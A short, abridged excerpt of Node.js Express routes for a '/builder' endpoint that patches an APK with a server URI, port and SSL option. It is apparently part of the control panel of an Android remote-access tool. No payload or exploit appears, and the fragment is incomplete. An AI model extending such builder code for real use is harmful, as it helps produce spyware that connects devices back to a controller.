...
routes.get('/builder', isAllowed, (req, res) => {
    // Get server URL for Railway or local
    const serverHost = process.env.RAILWAY_PUBLIC_DOMAIN || req.get('host');
    const isRailway = !!process.env.RAILWAY_PUBLIC_DOMAIN;
    
    res.render('builder', {
        myPort: isRailway ? 443 : CONST.control_port,
...
routes.post('/builder', isAllowed, (req, res) => {
    ...
    const useSSL = req.query.ssl === 'true' || req.query.ssl === '1';
    
    if (uri !== undefined) {
        apkBuilder.patchAPK(uri, port, useSSL, (error) => {
        ...
        logManager.log(CONST.logTypes.error, "Build Failed - Missing URI");
        res.json({ error: "Missing URI parameter" });
    }
});
